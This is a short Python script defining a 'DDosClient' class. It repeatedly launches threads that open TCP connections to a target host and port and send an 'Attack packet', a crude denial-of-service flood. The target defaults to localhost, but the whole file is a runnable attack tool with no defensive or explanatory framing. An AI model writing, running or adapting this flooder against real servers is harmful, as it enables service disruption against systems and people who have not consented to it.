import socket
import threading
import time

class DDosClient:
    def __init__(self, target_host="127.0.0.1", target_port=8080):
        self.target_host = target_host
        self.target_port = target_port

    def send_request(self):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((self.target_host, self.target_port))
            client_socket.send(b"Attack packet")
            response = client_socket.recv(1024)
            print(f"Response: {response.decode()}")
            client_socket.close()
        except Exception as e:
            print(f"Error: {e}")

    def start_attack(self, threads=10, duration=10):
        start_time = time.time()
        while time.time() - start_time < duration:
            for _ in range(threads):
                threading.Thread(target=self.send_request).start()
            time.sleep(0.1)

if __name__ == "__main__":
    client = DDosClient()
    client.start_attack()
